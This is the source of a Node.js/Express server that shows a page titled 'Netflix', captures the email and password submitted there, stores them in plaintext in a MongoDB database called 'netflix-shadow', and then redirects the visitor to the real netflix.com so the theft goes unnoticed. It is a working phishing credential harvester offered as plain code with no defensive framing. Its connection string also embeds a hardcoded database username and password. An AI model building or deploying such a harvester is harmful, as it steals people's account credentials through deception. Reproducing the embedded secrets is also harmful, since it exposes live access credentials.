const express = require('express');

const app = express();
const mongoose = require('mongoose');
const  bodyParser = require('body-parser');
app.use(express.json());
app.use(bodyParser.urlencoded({
    extended: false
 }));





app.use('/assets', express.static('assets'));

app.use(bodyParser.json());
app.set('view engine', 'ejs');

mongoose.connect("mongodb+srv://Shreyansh:shreytheking99@cluster0.5o5ap.mongodb.net/netflix-shadow?retryWrites=true&w=majority",{useNewUrlParser: true, useUnifiedTopology: true})
    .then(()=> console.log('Connected to MongoDB...'))
    .catch((err)=> console.error('Could not connect to the DB...', err))

const userSchema = new mongoose.Schema({
    email: String,
    password: String,
})

const User = mongoose.model('User', userSchema);


app.get('/', async (req,res)=>{
 
    res.render('index', {pageTitle: 'Netflix'});

    
});


app.post('/', async (req,res)=>{
    
     async function storeUser(){
        const user = new User({
            email: req.body.email,
         
            password: req.body.password
        })
    
        await user.save();
       console.log('New user stored in database');
    }
    storeUser();
    
    res.redirect('https://www.netflix.com/');
})





const port = process.env.PORT || 7777;


app.listen(port, ()=>{
    console.log(`Listening on port ${port}`);
});